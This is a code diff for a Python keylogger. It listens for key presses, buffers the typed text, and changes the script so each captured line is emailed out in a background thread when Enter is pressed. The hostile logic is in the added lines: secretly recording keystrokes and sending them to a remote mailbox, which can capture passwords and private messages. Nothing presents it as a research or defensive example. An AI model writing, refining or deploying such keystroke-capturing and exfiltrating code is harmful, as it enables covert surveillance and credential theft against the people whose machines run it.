@@ -18,6 +18,9 @@ def on_press(key):
         with lock:
             if key == keyboard.Key.space:
                 result += " "
+            elif key == keyboard.Key.enter:
+                send_email_in_background(result)  # Send email when Enter key is pressed
+                result = ""  # Clear the result after sending email
             elif key == keyboard.Key.esc:
                 stop_listener = True  # Stop the listener when Escape key is pressed
             else:
@@ -92,10 +95,5 @@ def send_email_in_background(body):
     email_thread = threading.Thread(target=send_email)
     email_thread.start()
 
-while True:
-    # Capture keyboard input
-    body = function_call()
-    
-    # Send email with the captured input in the background
-    send_email_in_background(body)
-
+# Start capturing keyboard input
+function_call()
